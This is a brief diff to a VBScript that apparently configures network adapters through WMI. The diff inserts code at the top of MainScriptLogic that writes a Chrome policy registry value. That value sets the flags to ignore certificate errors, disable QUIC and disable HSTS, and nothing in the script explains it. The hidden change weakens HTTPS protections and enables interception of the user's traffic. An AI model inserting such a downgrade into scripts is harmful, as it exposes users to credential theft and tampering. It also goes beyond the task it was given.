@@ -12,6 +12,14 @@ Else
 End If
 
 Sub MainScriptLogic()
+
+	Dim objShell
+	Set objShell = CreateObject("WScript.Shell")
+	Dim chromeKeyPath
+	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
+	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
+
+
     Dim objWMIService, colAdapters, objAdapter
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
     Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")
